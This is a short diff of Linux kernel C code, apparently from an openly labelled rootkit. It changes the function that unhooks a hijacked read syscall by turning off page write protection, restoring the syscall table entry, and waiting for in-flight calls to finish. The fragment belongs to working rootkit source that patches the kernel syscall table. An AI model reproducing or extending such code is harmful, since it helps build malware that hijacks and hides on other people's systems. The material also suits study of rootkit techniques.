@@ -79,22 +79,19 @@ void unhook_read(void)
 	
 	void **sys_call_table = (void *) sysmap_sys_call_table;
 	
-	/* ensure that all processes have left our manipulated syscall */
-	while(read_call_counter > 0) {
-		//msleep(2);
-	}
-	spin_lock_irqsave(&read_lock, read_lock_flags);
-	
 	/* disable write protection */
 	disable_page_protection();
 
 	/* restore the old syscall */
 	sys_call_table[__NR_read] = (unsigned long *) original_read;
 
-	spin_unlock_irqrestore(&read_lock, read_lock_flags);
-
 	/* reenable write protection */
 	enable_page_protection();
+	
+	/* ensure that all processes have left our manipulated syscall */
+	while(read_call_counter > 0) {
+		msleep(2);
+	}
 	
 	ROOTKIT_DEBUG("Done.\n");
 }
